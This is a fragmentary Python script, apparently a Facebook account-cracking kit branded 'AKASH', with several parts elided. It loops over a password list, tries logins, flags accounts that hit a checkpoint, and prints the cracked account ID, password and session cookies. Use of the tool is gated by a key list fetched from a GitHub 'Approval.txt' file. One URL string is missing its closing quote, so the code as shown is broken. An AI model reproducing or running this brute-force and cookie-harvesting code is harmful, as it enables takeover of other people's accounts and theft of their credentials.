...
princp=[]
try:
	prox= requests.get('https://github.com/Akash-Cyber-404/AKASH-tk/blob/main/Approval.txt').text
...
def uaku():
	try:
		...
		a=requests.get('https://github.com/Akash-Cyber-404/AKASH-tk/blob/main/Approval.txt).text
		ua=open('.bbnew.txt','w')
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				#AKASH
				print(f'\r\033[0;92m[{("%H:%M")}•AKASH-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
				print('\033[0;94m==============================================================')
...
def Subscraption():
	...
	r1=requests.get("https://github.com/Akash-Cyber-404/AKASH-tk/blob/main/Approval.txt").text
	if key1 in r1:
		os.system('clear')
		login()
	else:
